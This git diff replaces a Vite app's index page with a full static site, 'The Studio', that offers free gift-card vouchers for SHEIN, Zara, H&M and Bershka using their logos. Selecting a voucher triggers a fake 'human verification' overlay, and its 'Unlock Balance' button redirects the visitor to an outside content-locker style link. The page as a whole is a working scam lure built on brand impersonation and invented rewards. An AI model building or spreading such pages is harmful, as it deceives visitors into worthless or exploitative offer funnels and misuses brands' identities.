@@ -1,43 +1,400 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8" />
-  <link rel="icon" type="image/svg+xml" href="/vite.svg" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>The Studio | Lifestyle Access</title>
-  <!-- Tailwind CSS -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script>
-    tailwind.config = {
-      theme: {
-        extend: {
-          colors: {
-            champagne: '#F9F7F2',
-            sand: '#E6DDD0',
-            'gold-muted': '#C5A059',
-            'gold-light': '#E5D4B3',
-            charcoal: '#2C2C2C',
-            stone: '#8A8A8A',
-            'soft-white': '#FFFFFF',
-          },
-          fontFamily: {
-            sans: ['Montserrat', 'sans-serif'],
-            serif: ['Playfair Display', 'serif'],
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>The Studio | Lifestyle Access</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+          theme: {
+            extend: {
+              colors: {
+                champagne: '#F9F7F2',
+                sand: '#E6DDD0',
+                'gold-muted': '#C5A059',
+                'gold-light': '#E5D4B3',
+                charcoal: '#2C2C2C',
+                stone: '#8A8A8A',
+                'soft-white': '#FFFFFF',
+              },
+              fontFamily: {
+                sans: ['Montserrat', 'sans-serif'],
+                serif: ['Playfair Display', 'serif'],
+              }
+            }
           }
         }
-      }
-    }
-  </script>
-  <!-- Google Fonts -->
-  <link
-    href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600&family=Playfair+Display:ital,wght@0,400;0,500;0,600;1,400&display=swap"
-    rel="stylesheet">
+    </script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600&family=Playfair+Display:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+    <style>
+        body { 
+            font-family: 'Montserrat', sans-serif; 
+            background-color: var(--champagne); 
+            color: #2C2C2C;
+            -webkit-tap-highlight-color: transparent;
+            overflow-x: hidden;
+        }
+
+        h1, h2, h3, h4, .serif { font-family: 'Playfair Display', serif; }
+
+        /* Smooth Transitions */
+        .view-section {
+            display: none;
+            animation: fadeIn 0.8s ease-out forwards;
+        }
+        
+        .view-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn { 
+            from { opacity: 0; transform: translateY(10px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
+
+        /* Glassmorphism */
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        /* Custom Scrollbar */
+        .hide-scroll::-webkit-scrollbar { display: none; }
+        .hide-scroll { -ms-overflow-style: none; scrollbar-width: none; }
+
+        /* Editorial Image Masking */
+        .editorial-img { transition: transform 0.6s cubic-bezier(0.22, 1, 0.36, 1); }
+        .editorial-card:hover .editorial-img { transform: scale(1.03); }
+
+        /* Voucher Card */
+        .voucher-card {
+            background: linear-gradient(135deg, #ffffff 0%, #f7f7f7 100%);
+            transition: all 0.3s ease;
+        }
+        .voucher-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1);
+        }
+
+        /* Mobile Touch Targets */
+        button {
+            touch-action: manipulation;
+        }
+    </style>
 </head>
+<body class="bg-[#F9F7F2]">
 
-<body>
-  <div id="root"></div>
-  <script type="module" src="/src/main.jsx"></script>
+    <!-- VIEW 1: LANDING EXPERIENCE -->
+    <main id="view-landing" class="view-section active min-h-screen relative flex flex-col">
+        <nav class="absolute top-0 w-full p-6 md:p-8 flex justify-between items-center z-20">
+            <div class="serif italic text-2xl text-charcoal tracking-wide">The Studio.</div>
+            <button onclick="transitionTo('marketplace')" class="py-2 text-xs uppercase tracking-[0.2em] font-medium hover:text-gold-muted transition-colors">Member Sign In</button>
+        </nav>
+
+        <div class="flex-1 flex flex-col lg:flex-row h-full">
+            <!-- Visual Half -->
+            <div class="lg:w-1/2 h-[55vh] lg:h-auto relative overflow-hidden order-1 lg:order-2">
+                <img src="https://images.unsplash.com/photo-1469334031218-e382a71b716b?q=80&w=1200&auto=format&fit=crop" class="absolute inset-0 w-full h-full object-cover" alt="Lifestyle Editorial">
+                <div class="absolute inset-0 bg-gradient-to-t from-[#F9F7F2] via-transparent to-black/20 lg:from-transparent lg:bg-black/10"></div>
+            </div>
+
+            <!-- Content Half -->
+            <div class="lg:w-1/2 flex items-center justify-center px-8 py-12 lg:p-20 order-2 lg:order-1 -mt-10 lg:mt-0 relative z-10">
+                <div class="max-w-md w-full text-center lg:text-left">
+                    <span class="inline-block px-3 py-1 mb-6 border border-gold-muted/30 rounded-full text-[9px] uppercase tracking-[0.3em] text-gold-muted bg-white/50 backdrop-blur-sm">Invitation Only</span>
+                    <h1 class="text-5xl md:text-6xl lg:text-7xl leading-[1.1] mb-6 text-charcoal">
+                        Curated <br>
+                        <span class="italic text-stone font-light">Lifestyle</span> <br>
+                        Rewards
+                    </h1>
+                    <p class="text-sm font-light leading-loose text-stone mb-10 mx-auto lg:mx-0 max-w-xs">
+                        A sanctuary for trendsetters. Access premium credits for the world's most coveted fashion and beauty houses.
+                    </p>
+                    
+                    <!-- Professional Mobile-Ready Button -->
+                    <button onclick="transitionTo('marketplace')" class="group relative w-full md:w-auto px-10 py-5 bg-charcoal text-white rounded-full overflow-hidden shadow-xl hover:shadow-2xl transition-all duration-300 active:scale-[0.98]">
+                        <span class="absolute inset-0 w-full h-full bg-white/10 scale-x-0 group-hover:scale-x-100 transition-transform origin-left duration-500 ease-out"></span>
+                        <div class="relative flex items-center justify-center space-x-3">
+                            <span class="text-xs uppercase tracking-[0.25em] font-medium whitespace-nowrap">Enter The Studio</span>
+                            <svg class="w-4 h-4 opacity-70 group-hover:translate-x-1 transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                        </div>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- VIEW 2: MARKETPLACE & STUDIO DASHBOARD -->
+    <main id="view-marketplace" class="view-section min-h-screen pb-20">
+        <header class="sticky top-0 z-40 glass-panel px-6 py-4 flex justify-between items-center">
+            <div class="serif italic text-lg text-charcoal">The Studio.</div>
+            <div class="flex items-center space-x-6">
+                <div class="text-right hidden md:block">
+                    <div class="text-[9px] uppercase tracking-widest text-stone">Studio Balance</div>
+                    <div class="serif text-lg text-charcoal opacity-50">$0.00</div>
+                </div>
+                <div class="w-8 h-8 rounded-full bg-sand flex items-center justify-center text-charcoal text-xs serif italic">M</div>
+            </div>
+        </header>
+
+        <div class="container mx-auto px-6 pt-8 md:pt-12">
+            <div class="mb-12 fade-in">
+                <h2 class="text-3xl lg:text-5xl mb-3 text-charcoal">Welcome, <span class="italic text-stone">Guest</span></h2>
+                <p class="text-stone font-light text-sm">Select a brand below to view their exclusive voucher collection.</p>
+                
+                <div class="mt-8 p-4 bg-white rounded-xl border border-sand inline-flex items-center gap-4 shadow-sm max-w-full">
+                    <div class="w-2 h-2 rounded-full bg-stone shrink-0"></div>
+                    <span class="text-[10px] uppercase tracking-widest text-stone whitespace-nowrap">Status: <span class="text-charcoal font-medium">Pending Verification</span></span>
+                </div>
+            </div>
+
+            <!-- SECTION: MARKETPLACE DISCOVERY -->
+            <section>
+                <div class="flex items-end justify-between mb-8 border-b border-charcoal/10 pb-4">
+                    <h3 class="serif text-2xl italic text-charcoal">The Collection</h3>
+                    <div class="flex space-x-6 text-[10px] uppercase tracking-widest">
+                        <span class="text-charcoal cursor-pointer border-b border-charcoal pb-4 -mb-4.5">Fashion</span>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-8 pb-10">
+                    <!-- Brand Item 1: SHEIN -->
+                    <div class="editorial-card group cursor-pointer active:scale-[0.98] transition-transform" onclick="openBrandBoutique('shein')">
+                        <div class="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
+                            <img src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?q=80&w=600&auto=format&fit=crop" class="editorial-img w-full h-full object-cover" alt="Fashion">
+                            <div class="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
+                            <!-- Updated SHEIN Logo -->
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Shein_Logo_2017.svg/1280px-Shein_Logo_2017.svg.png" class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-20 md:w-24 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="SHEIN Logo">
+                            <div class="absolute bottom-4 left-4 text-white text-[9px] uppercase tracking-widest opacity-0 group-hover:opacity-100 transition-opacity">Enter Boutique</div>
+                        </div>
+                        <h4 class="text-sm font-medium text-charcoal">SHEIN</h4>
+                        <p class="text-[10px] text-stone uppercase tracking-wide">Summer Edit</p>
+                    </div>
+
+                    <!-- Brand Item 2: Zara -->
+                    <div class="editorial-card group cursor-pointer active:scale-[0.98] transition-transform" onclick="openBrandBoutique('zara')">
+                        <div class="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
+                            <img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?q=80&w=600&auto=format&fit=crop" class="editorial-img w-full h-full object-cover" alt="Trend">
+                            <div class="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fd/Zara_Logo.svg" class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-24 md:w-32 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="Zara Logo">
+                        </div>
+                        <h4 class="text-sm font-medium text-charcoal">Zara</h4>
+                        <p class="text-[10px] text-stone uppercase tracking-wide">Statement Pieces</p>
+                    </div>
+
+                    <!-- Brand Item 3: H&M -->
+                    <div class="editorial-card group cursor-pointer active:scale-[0.98] transition-transform" onclick="openBrandBoutique('hm')">
+                        <div class="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
+                            <img src="https://images.unsplash.com/photo-1441986300917-64674bd600d8?q=80&w=600&auto=format&fit=crop" class="editorial-img w-full h-full object-cover" alt="Style">
+                            <div class="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/H%26M-Logo.svg" class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-16 md:w-20 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="H&M Logo">
+                        </div>
+                        <h4 class="text-sm font-medium text-charcoal">H&M</h4>
+                        <p class="text-[10px] text-stone uppercase tracking-wide">Daily Essentials</p>
+                    </div>
+
+                    <!-- Brand Item 4: Bershka -->
+                    <div class="editorial-card group cursor-pointer active:scale-[0.98] transition-transform" onclick="openBrandBoutique('bershka')">
+                        <div class="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
+                            <img src="https://images.unsplash.com/photo-1503342394128-c104d54dba01?q=80&w=600&auto=format&fit=crop" class="editorial-img w-full h-full object-cover" alt="Runway">
+                            <div class="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/7/75/Bershka_logo.svg" class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-24 md:w-32 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="Bershka Logo">
+                        </div>
+                        <h4 class="text-sm font-medium text-charcoal">Bershka</h4>
+                        <p class="text-[10px] text-stone uppercase tracking-wide">Youth Culture</p>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <!-- VIEW 3: BRAND BOUTIQUE (DYNAMIC) -->
+    <main id="view-brand-detail" class="view-section min-h-screen bg-white hidden">
+        <header class="sticky top-0 z-40 bg-white/90 backdrop-blur-md border-b border-gray-100 px-6 py-4 flex justify-between items-center">
+            <button onclick="transitionTo('marketplace')" class="flex items-center space-x-2 text-stone hover:text-charcoal transition-colors group p-2 -ml-2">
+                <svg class="w-5 h-5 transform group-hover:-translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 19l-7-7 7-7"></path></svg>
+                <span class="text-[10px] uppercase tracking-widest font-medium">Back</span>
+            </button>
+            <div class="serif italic text-lg text-charcoal">The Studio.</div>
+        </header>
+
+        <!-- Brand Hero -->
+        <div class="relative h-64 md:h-80 w-full overflow-hidden">
+            <img id="detail-brand-img" src="" class="absolute inset-0 w-full h-full object-cover" alt="Brand Hero">
+            <div class="absolute inset-0 bg-black/30"></div>
+            <div class="absolute inset-0 flex items-center justify-center p-8">
+                <img id="detail-brand-logo" src="" class="h-16 md:h-24 w-auto max-w-[70%] brightness-0 invert opacity-100 drop-shadow-xl object-contain" alt="Brand Logo">
+            </div>
+        </div>
+
+        <div class="container mx-auto px-6 py-12">
+            <div class="text-center mb-12">
+                <h2 class="text-3xl font-medium mb-2 text-charcoal" id="detail-brand-name">Brand Name</h2>
+                <p class="text-stone font-light text-sm italic">Select a voucher to purchase & unlock.</p>
+                <div class="w-12 h-[1px] bg-gold-muted mx-auto mt-6"></div>
+            </div>
+
+            <!-- Vouchers Grid -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-5xl mx-auto pb-12" id="voucher-grid">
+                <!-- Populated via JS -->
+            </div>
+        </div>
+    </main>
+
+    <!-- VIEW 4: ELEGANT VERIFICATION OVERLAY -->
+    <div id="verification-overlay" class="fixed inset-0 z-50 hidden">
+        <div class="absolute inset-0 bg-sand/80 backdrop-blur-xl transition-opacity duration-500" onclick="closeVerification()"></div>
+        <div class="absolute inset-0 flex items-center justify-center p-6">
+            <div class="bg-white w-full max-w-md rounded-[30px] p-8 md:p-14 shadow-2xl relative text-center">
+                <button onclick="closeVerification()" class="absolute top-6 right-6 p-2 text-stone hover:text-charcoal transition-colors">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M6 18L18 6M6 6l12 12"></path></svg>
+                </button>
+
+                <div class="w-12 h-[1px] bg-gold-muted mx-auto mb-8"></div>
+                <h3 class="serif text-2xl md:text-3xl text-charcoal mb-4 italic">Verification Required</h3>
+                <p class="text-stone text-xs leading-loose mb-10 font-light">
+                    To maintain the integrity of our studio and unlock your selected voucher, we require a brief human verification.
+                </p>
+
+                <div class="bg-champagne rounded-2xl p-6 mb-10 text-left relative overflow-hidden">
+                    <div class="absolute top-0 right-0 w-20 h-20 bg-gold-light/20 rounded-bl-full -mr-4 -mt-4"></div>
+                    <div class="relative z-10">
+                        <div class="text-[10px] uppercase tracking-widest text-stone mb-1">Item</div>
+                        <div class="font-bold text-charcoal text-lg mb-4 truncate pr-4" id="modal-brand-name">Brand Name</div>
+                        
+                        <div class="flex justify-between items-end border-t border-charcoal/10 pt-4">
+                            <div>
+                                <div class="text-[10px] uppercase tracking-widest text-stone mb-1">Value</div>
+                                <div class="font-serif text-2xl text-charcoal italic" id="modal-tier-amount">$0.00</div>
+                            </div>
+                            <div class="text-[10px] uppercase tracking-widest text-gold-muted font-bold flex items-center gap-1">
+                                <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                                Locked
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button onclick="finalRedirect()" id="verify-btn" class="w-full bg-charcoal text-white py-5 rounded-full text-[10px] uppercase tracking-[0.25em] hover:bg-black transition-colors shadow-lg active:scale-[0.98]">
+                    Unlock Balance
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Brand Data Structure
+        const brands = {
+            shein: {
+                name: "SHEIN",
+                img: "https://images.unsplash.com/photo-1496747611176-843222e1e57c?q=80&w=1200",
+                // Updated Logo URL to specific user request
+                logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Shein_Logo_2017.svg/1280px-Shein_Logo_2017.svg.png",
+                vouchers: [200, 500, 750],
+                color: "bg-black text-white"
+            },
+            zara: {
+                name: "Zara",
+                img: "https://images.unsplash.com/photo-1483985988355-763728e1935b?q=80&w=1200",
+                logo: "https://upload.wikimedia.org/wikipedia/commons/f/fd/Zara_Logo.svg",
+                vouchers: [200, 500, 750],
+                color: "bg-black text-white"
+            },
+            hm: {
+                name: "H&M",
+                img: "https://images.unsplash.com/photo-1441986300917-64674bd600d8?q=80&w=1200",
+                logo: "https://upload.wikimedia.org/wikipedia/commons/5/53/H%26M-Logo.svg",
+                vouchers: [100, 250, 500],
+                color: "bg-red-600 text-white"
+            },
+            bershka: {
+                name: "Bershka",
+                img: "https://images.unsplash.com/photo-1503342394128-c104d54dba01?q=80&w=1200",
+                logo: "https://upload.wikimedia.org/wikipedia/commons/7/75/Bershka_logo.svg",
+                vouchers: [100, 250, 500],
+                color: "bg-black text-white"
+            }
+        };
+
+        let currentBrand = null;
+
+        function transitionTo(viewName) {
+            document.querySelectorAll('.view-section').forEach(el => {
+                el.classList.remove('active');
+                if(!el.classList.contains('hidden')) el.style.display = 'none';
+                el.classList.add('hidden'); // Ensure utility class hidden is applied
+            });
+
+            const target = document.getElementById(`view-${viewName}`);
+            target.classList.remove('hidden');
+            target.style.display = 'block';
+            void target.offsetWidth; 
+            target.classList.add('active');
+            window.scrollTo(0,0);
+        }
+
+        function openBrandBoutique(brandKey) {
+            const brand = brands[brandKey];
+            currentBrand = brand;
+
+            // Populate Brand Details
+            document.getElementById('detail-brand-name').innerText = brand.name + " Boutique";
+            document.getElementById('detail-brand-img').src = brand.img;
+            document.getElementById('detail-brand-logo').src = brand.logo;
+
+            // Generate Voucher Cards
+            const grid = document.getElementById('voucher-grid');
+            grid.innerHTML = '';
+            
+            brand.vouchers.forEach((amount, index) => {
+                const isPremium = index === 1; // Middle option highlighting
+                
+                const card = document.createElement('div');
+                card.className = `voucher-card p-8 rounded-[2rem] border border-gray-100 flex flex-col items-center justify-between text-center cursor-pointer relative overflow-hidden ${isPremium ? 'ring-1 ring-gold-muted' : ''} active:scale-[0.98] transition-transform`;
+                card.onclick = () => selectVoucher(amount);
+
+                card.innerHTML = `
+                    <div class="w-full flex justify-between items-start mb-8 z-10">
+                        <span class="text-[9px] uppercase tracking-widest text-stone">Gift Card</span>
+                        <img src="${brand.logo}" class="h-4 w-auto brightness-0 opacity-50">
+                    </div>
+                    <div class="serif text-5xl mb-2 text-charcoal z-10">$${amount}</div>
+                    <div class="text-[10px] text-stone tracking-wide mb-8 z-10">Digital Voucher</div>
+                    <button class="w-full py-3 rounded-full bg-charcoal text-white text-[10px] uppercase tracking-widest hover:bg-black transition-colors z-10 shadow-lg">Purchase</button>
+                    ${isPremium ? '<div class="absolute top-0 right-0 bg-gold-muted text-white text-[8px] px-3 py-1 rounded-bl-xl uppercase tracking-widest">Popular</div>' : ''}
+                `;
+                grid.appendChild(card);
+            });
+
+            transitionTo('brand-detail');
+        }
+
+        function selectVoucher(amount) {
+            document.getElementById('modal-tier-amount').innerText = '$' + amount + '.00';
+            document.getElementById('modal-brand-name').innerText = currentBrand.name + " Digital Voucher";
+            
+            const overlay = document.getElementById('verification-overlay');
+            overlay.classList.remove('hidden');
+            overlay.querySelector('div').classList.add('fade-in');
+        }
+
+        function closeVerification() {
+            document.getElementById('verification-overlay').classList.add('hidden');
+        }
+
+        function finalRedirect() {
+            const btn = document.getElementById('verify-btn');
+            btn.innerHTML = "Processing...";
+            btn.classList.add('opacity-75', 'cursor-not-allowed');
+            setTimeout(() => {
+                window.location.href = "https://lockedpage1.website/cl/i/qkv7w4";
+            }, 800);
+        }
+    </script>
 </body>
-
 </html>
